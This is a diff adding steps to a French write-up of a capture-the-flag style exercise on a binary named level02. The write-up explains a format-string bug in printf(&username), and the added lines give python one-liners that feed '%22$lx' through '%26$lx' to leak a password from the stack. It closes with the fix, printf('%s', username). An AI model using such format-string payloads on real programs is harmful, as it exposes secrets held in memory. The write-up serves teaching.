@@ -3,5 +3,15 @@ En faisant du reverse-engineering sur le binaire level02 nous avons decouvert un
 En effet, il y a dans le code un appel dangereux a printf, car il l'utilisateur peut passer n'importe quel parametre en argument.
 L'appel ressemble a `printf(&username)`. Puisque username est une variable controlee par l'utilsiateur, un acteur malicieux peut essayer d'y inserer des %x pour sonder la memoire... et ainsi recuperer par exemple, le flag qui est situe sur la stack.
 
+Par exemple: 
+Appeler le binaire et scanner les zones dans lesquelles se trouvent le mot de passe:
+`python -c 'print("%22$lx")' | ./level02`
+`python -c 'print("%23$lx")' | ./level02`
+`python -c 'print("%24$lx")' | ./level02`
+`python -c 'print("%25$lx")' | ./level02`
+`python -c 'print("%26$lx")' | ./level02`
+
+Puis ensuite utiliser le script qui se trouve dans les Ressources afin de traduire ces chiffres hexa en ascii et obtenir ainsi le mot de passe!
+
 Afin de se premunir de se bug, nous recommandons de remplacer ce code par un `printf("%s", username)`, qui s'assurera donc de n'afficher seulement qu'une chaine de caracteres!
 
